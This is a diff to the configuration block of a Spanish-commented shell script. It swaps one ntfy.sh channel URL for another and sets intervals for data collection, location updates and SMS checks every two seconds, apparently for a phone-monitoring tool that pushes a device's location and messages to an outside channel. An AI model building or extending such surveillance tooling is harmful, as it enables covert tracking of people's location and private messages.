@@ -3,7 +3,7 @@
 # Incluye todas las funciones originales con mejoras de estabilidad
 
 # ===== CONFIGURACIÓN =====
-NTFY_URL="https://ntfy.sh/JudaszJunsn9"  # REEMPLAZAR CON TU CANAL
+NTFY_URL="https://ntfy.sh/3kG4epWMkei6KLLq"  # REEMPLAZAR CON TU CANAL
 INTERVALO_PRINCIPAL=300    # 5 minutos para recolección completa
 INTERVALO_UBICACION=60     # 1 minuto para actualizar ubicación
 INTERVALO_SMS=2            # 2 segundos para verificar nuevos SMS
